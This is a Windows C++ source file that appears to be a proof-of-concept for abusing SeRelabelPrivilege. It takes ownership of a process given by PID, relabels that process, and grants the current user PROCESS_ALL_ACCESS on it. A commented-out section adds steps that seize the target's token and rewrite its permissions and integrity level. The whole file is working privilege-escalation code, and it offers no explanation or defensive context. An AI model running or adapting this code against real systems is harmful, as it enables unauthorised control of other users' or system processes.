#include <windows.h>
#include <sddl.h>
#include <stdio.h>
#include <Windows.h>
#include <Aclapi.h>
#include <iostream>
#define LOW_INTEGRITY_SDDL_SACL_W L"S:(ML;;NW;;;LW)" 
BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        printf("LookupPrivilegeValue error: %u\n", GetLastError());
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = (bEnablePrivilege) ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        printf("AdjustTokenPrivileges error: %u\n", GetLastError());
        return FALSE;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        printf("The token does not have the specified privilege. \n");
        return FALSE;
    }

    return TRUE;
}






BOOL TakeTokenOwnership(HANDLE hProcess, PSID pSidOwner)
{
    HANDLE hToken = NULL;
    //PSID pSidOwner = NULL;
    TOKEN_OWNER to = { 0 };
    DWORD dwSize = 0;

    // Open the process token
    if (!OpenProcessToken(hProcess, WRITE_OWNER, &hToken))
    {
        printf("TakeTokenOwnership: OpenProcessToken Error %u\n", GetLastError());
        return FALSE;
    }
    DWORD dwRes = SetSecurityInfo(hToken, SE_KERNEL_OBJECT, OWNER_SECURITY_INFORMATION | LABEL_SECURITY_INFORMATION, pSidOwner, NULL, NULL, NULL);
    if (dwRes != ERROR_SUCCESS)
    {
        printf("TakeTokenOwnership: SetSecurity  Error %u\n", GetLastError());
        return FALSE;
    }
    printf("TakeTokenOwnership: successfully Changed Ownership of Token %u\n", GetLastError());
    return TRUE;
}

BOOL ChangeTokenPerms(HANDLE hProcess, PSID pSidOwner)
{
    
    EXPLICIT_ACCESS ea;
    PACL pOldDACL = NULL, pNewDACL = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;
    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, WRITE_DAC | READ_CONTROL, &hToken))
    {
        printf("ChangeTokenPerms: OpenProcessToken Error %u\n", GetLastError());
        return FALSE;
    }
    // Get the current security descriptor
    if (GetSecurityInfo(hToken, SE_KERNEL_OBJECT, OWNER_SECURITY_INFORMATION | DACL_SECURITY_INFORMATION, &pSidOwner, NULL, &pOldDACL, NULL, &pSD) != ERROR_SUCCESS)
    {
        printf("ChangeTokenPerms: GetSecurityInfo Error %u\n", GetLastError());
        return FALSE;
    }

    // Initialize the EXPLICIT_ACCESS structure for the owner
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = GENERIC_ALL;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.ptstrName = (LPTSTR)pSidOwner;

    // Create a new DACL that grants full control to the owner
    if (SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL) != ERROR_SUCCESS)
    {
        printf("ChangeTokenPerms: SetEntriesInAcl Error %u\n", GetLastError());
        LocalFree(pSD);
        return FALSE;
    }

    // Apply the new DACL to the object
    if (SetSecurityInfo(hToken, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, pSidOwner, NULL, pNewDACL, NULL) != ERROR_SUCCESS)
    {
        printf("ChangeTokenPerms: SetSecurityInfo Error %u\n", GetLastError());
        LocalFree(pSD);
        LocalFree(pNewDACL);
        return FALSE;
    }

    printf("ChangeTokenPerms: Successfully set full control.\n");

    // Cleanup
    LocalFree(pSD);
    LocalFree(pNewDACL);

    return TRUE;
}
    

BOOL SetTokenIntegrityLevel(HANDLE hProcess, LPCWSTR szIntegritySid)
{
    HANDLE hToken = NULL;
    TOKEN_MANDATORY_LABEL tml = { 0 };
    PSID pIntegritySid = NULL;
    DWORD dwLengthNeeded;

    // Open the process token
    if (!OpenProcessToken(hProcess, TOKEN_ADJUST_DEFAULT | TOKEN_QUERY, &hToken))
    //if (!OpenProcessToken(hProcess, WRITE_OWNER, &hToken))
    {
        printf("SetProcessIntegrityLevel: OpenProcessToken Error %u\n", GetLastError());
        return FALSE;
    }

    // Convert the string SID to a SID
    if (!ConvertStringSidToSid(szIntegritySid, &pIntegritySid))
    {
        printf("ConvertStringSidToSid Error %u\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    // Set the integrity level in the token
    tml.Label.Attributes = SE_GROUP_INTEGRITY;
    tml.Label.Sid = pIntegritySid;

    if (!SetTokenInformation(hToken, TokenIntegrityLevel, &tml,
        sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(pIntegritySid)))
    {
        printf("SetProcessIntegrityLevel: SetTokenInformation Error %u\n", GetLastError());
        LocalFree(pIntegritySid);
        CloseHandle(hToken);
        return FALSE;
    }

    printf("SetProcessIntegrityLevel:Successfully changed process integrity level.\n");

    // Cleanup
    LocalFree(pIntegritySid);
    CloseHandle(hToken);

    return TRUE;
}
BOOL GrantProcessFullControl(int pid, PSID pSid)
{
    PACL pOldDACL = NULL, pNewDACL = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;

    HANDLE hProc = OpenProcess(WRITE_DAC | READ_CONTROL, FALSE, pid);
    if (hProc == NULL)
    {
        printf("GrantProcessFullControl: OpenProcess GetLastError %d\n", GetLastError());
        return FALSE;
    }
    DWORD dwRes = GetSecurityInfo(hProc, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDACL, NULL, &pSD);
    if (dwRes != ERROR_SUCCESS)
    {
        printf("GrantProcessFullControl: GetSecurityInfo Error:%d\n", GetLastError());
        return FALSE;

    }

    // Initialize an EXPLICIT_ACCESS structure for the new ACE
    EXPLICIT_ACCESS ea;
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = PROCESS_ALL_ACCESS;
    ea.grfAccessMode = GRANT_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_USER;
    ea.Trustee.ptstrName = (LPTSTR)pSid;

    // Create a new DACL with the new ACE
    dwRes = SetEntriesInAclW(1, &ea, pOldDACL, &pNewDACL);
    if (dwRes != ERROR_SUCCESS)
    {
        printf("GrantProcessFullControl: SetEntriesInAclW Error:%d\n", GetLastError());
        return FALSE;

    }
    dwRes = SetSecurityInfo(hProc, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDACL, NULL);
    if (dwRes != ERROR_SUCCESS)
    {
        printf("GrantProcessFullControl: SetSecurityInfo Error:%d\n", GetLastError());
        return FALSE;

    }
    printf("GrantProcessFullControl: Successfully granted full control on the process %d to current user\n",pid);
    CloseHandle(hProc);
    return TRUE;
}
BOOL TakeProcessOwnership(int pid, PSID pSid)
{
    HANDLE hProc = OpenProcess(WRITE_OWNER, FALSE, pid);
    if (hProc == NULL) {
        printf("TakeProcessOwnership: OpenProcess GetLastError %d\n", GetLastError());
        return FALSE;
    }

    
    DWORD dwRes = SetSecurityInfo(hProc, SE_KERNEL_OBJECT, OWNER_SECURITY_INFORMATION | LABEL_SECURITY_INFORMATION, pSid, NULL, NULL, NULL);
    if (dwRes != ERROR_SUCCESS)
    {
        printf("TakeProcessOwnership: SetSecurityInfo Error: %d %d\n", dwRes, GetLastError());
        return FALSE;
    }
    else
        printf("TakeProcessOwnership: Successfully took ownership of the process %d handle.\n", pid);
    CloseHandle(hProc);
    return TRUE;
}

BOOL GetCurrentUserSid(HANDLE hToken, PSID* ppSid) {
    
    DWORD dwSize = 0;
    PTOKEN_USER pTokenUser = NULL;
    BOOL bResult = FALSE;

    // Open the access token associated with the current process
    

    // Get the required size for the token information
    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        printf("GetCurrentUserSid:GetTokenInformation failed. GetLastError: %u\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    // Allocate memory for the token information
    pTokenUser = (PTOKEN_USER)malloc(dwSize);
    if (pTokenUser == NULL) {
        printf("Memory allocation failed.\n");
        CloseHandle(hToken);
        return FALSE;
    }

    // Retrieve the token information
    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
        printf("GetCurrentUserSid:GetTokenInformation failed. GetLastError: %u\n", GetLastError());
        free(pTokenUser);
        CloseHandle(hToken);
        return FALSE;
    }

    // Get the length of the SID
    dwSize = GetLengthSid(pTokenUser->User.Sid);

    // Allocate memory for the SID
    *ppSid = (PSID)malloc(dwSize);
    if (*ppSid == NULL) {
        printf("GetCurrentUserSid:Memory allocation failed.\n");
        free(pTokenUser);
        CloseHandle(hToken);
        return FALSE;
    }

    // Copy the SID to the allocated memory
    if (!CopySid(dwSize, *ppSid, pTokenUser->User.Sid)) {
        printf("GetCurrentUserSid:CopySid failed. GetLastError: %u\n", GetLastError());
        free(*ppSid);
        *ppSid = NULL;
        free(pTokenUser);
        CloseHandle(hToken);
        return FALSE;
    }

    // Cleanup
    free(pTokenUser);
    

    return TRUE;
}
int main(int argc, char** argv)
{
    HANDLE hToken = NULL;
    HANDLE hProc = NULL;
    PSID pSid = NULL;
    PSID AdminSid = NULL;
    int pid = atoi(argv[1]);

    // Open the process token with necessary permissions
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        printf("OpenProcessToken error: %u\n", GetLastError());
        return 1;
    }
    // Get the current user SID
    GetCurrentUserSid(hToken, &pSid);
    // Enable the necessary privileges
    if (!SetPrivilege(hToken, SE_RELABEL_NAME, TRUE)) {
        printf("Failed to set necessary privileges.\n");
        CloseHandle(hToken);
        return 1;
    }

    // Take Ownershio of the process
    if (!TakeProcessOwnership(pid, pSid))
        return 1;
    // grant to current user full control on process
    if (!GrantProcessFullControl(pid, pSid))

        return 1;
    
    /*
    
    
    
    hProc = OpenProcess(PROCESS_QUERY_INFORMATION | WRITE_OWNER, FALSE, pid);
    if (hProc == NULL)
        printf("OpenProcess for token :%d\n", GetLastError());
    TakeTokenOwnership(hProc, pSid);

    CloseHandle(hProc);
    hProc = OpenProcess(PROCESS_QUERY_INFORMATION | WRITE_DAC , FALSE, pid);
    ChangeTokenPerms(hProc, pSid);
    CloseHandle(hProc);
    
    //if (!SetProcessIntegrityLevel(hProc, L"S-1-16-12288"))
    //if (!SetProcessIntegrityLevel(hProc, L"S-1-16-16384"))
    hProc = OpenProcess(PROCESS_QUERY_INFORMATION | WRITE_DAC, FALSE, atoi(argv[1]));
    if (!SetTokenIntegrityLevel(hProc, L"S-1-16-8192"))
      
    {
        printf("Failed to set integrity level %d\n", GetLastError());
        CloseHandle(hProc);
        return 1;
    }
    
    */
    
    return 0;
}